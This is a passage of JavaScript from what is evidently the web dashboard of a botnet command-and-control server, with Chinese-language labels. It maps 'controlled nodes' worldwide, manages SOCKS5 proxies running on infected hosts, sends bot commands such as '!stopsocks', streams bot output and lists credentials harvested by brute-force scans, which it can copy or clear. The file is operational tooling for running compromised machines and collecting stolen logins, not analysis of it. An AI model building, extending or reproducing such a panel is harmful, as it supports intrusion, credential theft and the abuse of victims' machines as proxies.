      L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}', {
        maxZoom: 16
      }).addTo(fullMap);
      if (window._botsArr) updateGlobalMap(window._botsArr);
    } catch (e) {}
  }
}

function renderFallbackMap(containerId, bots) {
  var c = document.getElementById(containerId);
  if (!c) return;
  var html = '<div style="position:relative;width:100%;height:100%;background:#080d18;border-radius:10px;overflow:hidden;display:flex;flex-direction:column;align-items:center;justify-content:center;border:1px solid #1f293d">';
  html += '<svg viewBox="0 0 1000 500" style="width:100%;height:100%;opacity:0.25;position:absolute;top:0;left:0;pointer-events:none">';
  html += '<path d="M150,150 Q200,100 350,140 Q400,200 300,280 Q200,300 150,150 Z M550,120 Q700,80 850,150 Q900,250 750,300 Q600,280 550,120 Z M380,300 Q450,320 420,420 Q350,450 380,300 Z M750,350 Q850,340 820,440 Q720,450 750,350 Z" fill="#1e293b" stroke="#334155" stroke-width="1.5"/>';
  html += '</svg>';
  html += '<div style="position:relative;z-index:2;width:92%;height:88%;display:flex;flex-direction:column;gap:8px">';
  html += '<div style="display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #1e293b;padding-bottom:6px">';
  html += '<span style="font-size:12px;font-weight:700;color:var(--accent)">🌐 受控节点全息分布拓扑 (Tor 暗网 / 离线全景视图)</span>';
  html += '<span style="font-size:12px;color:var(--green)">在线节点: ' + (bots ? bots.length : 0) + '</span>';
  html += '</div>';
  html += '<div style="flex:1;overflow-y:auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;padding:6px 0">';
  if (bots && bots.length) {
    bots.forEach(function (b) {
      html += '<div style="background:#131b2e;border:1px solid #1e293b;border-radius:6px;padding:8px 12px;display:flex;align-items:center;gap:10px">';
      html += '<div style="width:8px;height:8px;border-radius:50%;background:#00ff66;box-shadow:0 0 6px #00ff66"></div>';
      html += '<div style="flex:1;min-width:0">';
      html += '<div style="font-weight:700;color:var(--accent);font-size:12px;overflow:hidden;text-overflow:ellipsis">' + escHtml(b.botID) + '</div>';
      html += '<div style="font-size:11px;color:#888">' + escHtml(b.ip) + ' | ' + escHtml(b.arch) + '</div>';
      html += '</div>';
      html += '<span class="cap-badge">' + escHtml(b.country || 'US') + '</span>';
      html += '</div>';
    });
  } else {
    html += '<div style="grid-column:1/-1;text-align:center;color:#666;padding:30px">暂无在线受控端...</div>';
  }
  html += '</div></div></div>';
  c.innerHTML = html;
}

function updateGlobalMap(bots) {
  if (!bots) return;
  var countEl = document.getElementById('map-bot-count');
  if (countEl) countEl.textContent = '在线节点: ' + bots.length;

  if (typeof L === 'undefined') {
    renderFallbackMap('map-container', bots);
    renderFallbackMap('full-map-container', bots);
    return;
  }

  if (!globalMap) initGlobalMap();

  if (globalMap && typeof L !== 'undefined') {
    Object.keys(mapMarkers).forEach(function (id) { try { globalMap.removeLayer(mapMarkers[id]); } catch (e) {} });
    mapMarkers = {};

    bots.forEach(function (b) {
      var cc = (b.country || 'US').toUpperCase();
      var coords = countryCoords[cc] || [37.0902, -95.7129];
      var lat = coords[0] + (Math.random() - 0.5) * 1.5;
      var lng = coords[1] + (Math.random() - 0.5) * 1.5;

      var icon = L.divIcon({
        className: 'custom-map-icon',
        html: '<div class="bot-map-pin" title="' + escHtml(b.botID) + ' (' + escHtml(b.ip) + ')"></div>',
        iconSize: [14, 14], iconAnchor: [7, 7]
      });

      var marker = L.marker([lat, lng], { icon: icon }).addTo(globalMap);
      mapMarkers[b.botID] = marker;

      if (fullMap) {
        var m2 = L.marker([lat, lng], { icon: icon }).addTo(fullMap);
        fullMapMarkers[b.botID] = m2;
      }
    });
  } else {
    renderFallbackMap('map-container', bots);
    renderFallbackMap('full-map-container', bots);
  }
}

function escHtml(s) {
  if (!s) return '';
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function toggleTheme() {
  var cur = document.documentElement.getAttribute('data-theme');
  document.documentElement.setAttribute('data-theme', cur === 'light' ? 'dark' : 'light');
}

function renderActivity(entries) {
  if (!entries || !entries.length) return;
  var tbody = document.getElementById('activity-tbody');
  var html = '';
  entries.slice(0, 15).forEach(function (e) {
    html += '<tr>' +
      '<td>' + escHtml(e.timestamp || '刚刚') + '</td>' +
      '<td><span class="cap-badge">' + escHtml(e.type || 'EVENT') + '</span></td>' +
      '<td>' + escHtml(e.message) + '</td>' +
      '</tr>';
  });
  tbody.innerHTML = html;
}

function switchCmdCat(btn) {
  var cat = btn.getAttribute('data-cat');
  document.querySelectorAll('.cmd-cat-pills .cmd-cat-btn').forEach(function (b) { b.classList.remove('active'); });
  btn.classList.add('active');

  var sel = document.getElementById('cmd-type');
  if (!sel) return;
  for (var i = 0; i < sel.options.length; i++) {
    var opt = sel.options[i];
    var optCat = opt.getAttribute('data-cat');
    if (!cat || optCat === cat) {
      opt.style.display = '';
    } else {
      opt.style.display = 'none';
    }
  }
  for (var j = 0; j < sel.options.length; j++) {
    if (sel.options[j].style.display !== 'none') {
      sel.selectedIndex = j;
      break;
    }
  }
  updateArgFields();
}

function filterBotTable() {
  var q = (document.getElementById('bot-search').value || '').toLowerCase().trim();
  var rows = document.querySelectorAll('#bot-tbody tr');
  var count = 0;
  rows.forEach(function (r) {
    if (r.cells && r.cells.length < 2) return;
    var text = r.textContent.toLowerCase();
    if (!q || text.indexOf(q) !== -1) {
      r.style.display = '';
      count++;
    } else {
      r.style.display = 'none';
    }
  });
  var countEl = document.getElementById('search-count');
  if (countEl) countEl.textContent = q ? ('已筛选出 ' + count + ' 个受控端') : '';
}

function selectAllBots(master) {
  var chks = document.querySelectorAll('.bot-chk');
  chks.forEach(function (c) {
    c.checked = master.checked;
  });
}

function updateProxies(bots) {
  var tbody = document.getElementById('proxy-tbody');
  var badge = document.getElementById('badge-socks');
  if (!tbody) return;
  var count = 0;
  var html = '';
  if (bots && bots.length) {
    bots.forEach(function (b) {
      if (b.socksActive) {
        count++;
        html += '<tr>' +
          '<td><span class="cap-badge purple">SOCKS5</span></td>' +
          '<td style="font-weight:700;color:var(--accent)">' + escHtml(b.botID) + '</td>' +
          '<td>' + escHtml(b.socksRelay || '0.0.0.0:1080') + '</td>' +
          '<td>-</td>' +
          '<td style="color:var(--green)">运行中</td>' +
          '<td><button class="cmd-cat-btn" style="background:var(--red-dim);color:var(--red)" onclick="popupCmd(\'' + b.botID + '\', \'!stopsocks\')">停止</button></td>' +
          '</tr>';
      }
    });
  }
  if (badge) badge.textContent = count;
  if (!html) {
    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;color:var(--text-dim)">暂无活动的 SOCKS 代理或端口转发隧道</td></tr>';
  } else {
    tbody.innerHTML = html;
  }
}

function loadScanResults() {
  fetch('/api/scan_results').then(function (r) { return r.json(); }).then(renderScanResults).catch(function () {});
}

function renderScanResults(list) {
  var tbody = document.getElementById('scan-results-tbody');
  if (!tbody) return;
  if (!list || !list.length) {
    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:24px;color:var(--text-dim)">暂无实时上报的扫描战报或凭据...</td></tr>';
    return;
  }
  var html = '';
  list.forEach(function (item) {
    var typeBadgeClass = (item.type && item.type.indexOf('爆破') !== -1) ? 'purple' : 'green';
    html += '<tr>' +
      '<td style="color:#888;font-size:11px">' + escHtml(item.timestamp || '刚刚') + '</td>' +
      '<td style="font-weight:700;color:var(--accent)">' + escHtml(item.botID) + '</td>' +
      '<td><span class="cap-badge ' + typeBadgeClass + '">' + escHtml(item.type) + '</span></td>' +
      '<td style="font-family:var(--mono);font-size:12px;font-weight:600">' + escHtml(item.target) + '</td>' +
      '<td style="font-family:var(--mono);color:#00ff66;font-size:12px;word-break:break-all">' + escHtml(item.result) + '</td>' +
      '<td><button class="cmd-cat-btn" style="padding:2px 8px;font-size:11px" onclick="copyText(\'' + escHtml(item.result).replace(/'/g, "\\'") + '\')">复制</button></td>' +
      '</tr>';
  });
  tbody.innerHTML = html;
}

function clearScanResults() {
  if (!confirm('确定清空所有上报的扫描战报与凭据？')) return;
  fetch('/api/scan_results', { method: 'DELETE' })
    .then(function (r) { return r.json(); })
    .then(function () { loadScanResults(); });
}

function copyText(txt) {
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(txt).then(function() {
      alert('已复制到剪贴板: ' + txt);
    });
  } else {
    var input = document.createElement('textarea');
    input.value = txt;
    document.body.appendChild(input);
    input.select();
    document.execCommand('copy');
    document.body.removeChild(input);
    alert('已复制到剪贴板: ' + txt);
  }
}

function initSSE() {
  if (typeof EventSource === 'undefined') return;
  try {
    var es = new EventSource('/api/events');
    var dot = document.getElementById('sse-dot');
    var txt = document.getElementById('sse-text');
    es.onopen = function () {
      if (dot) dot.className = 'sse-dot connected';
      if (txt) txt.textContent = '实时通道: 已建立';
    };
    es.onerror = function () {
      if (dot) dot.className = 'sse-dot disconnected';
      if (txt) txt.textContent = '实时通道: 离线';
    };
    es.addEventListener('activity', function () {
      refreshAll();
    });
    es.addEventListener('bot_output', function (evt) {
      try {
        var data = JSON.parse(evt.data);
        if (data && data.output) {
          logConsoleBotOutput(data.botID, data.output, data.timestamp);
        }
      } catch (e) {}
    });
    es.addEventListener('scan_result', function () {
      loadScanResults();
    });
  } catch (e) {}
}

// Initialize application
document.addEventListener('DOMContentLoaded', function () {
  updateArgFields();
  startPolling();
  refreshAll();
  initSSE();
  loadScanResults();
});

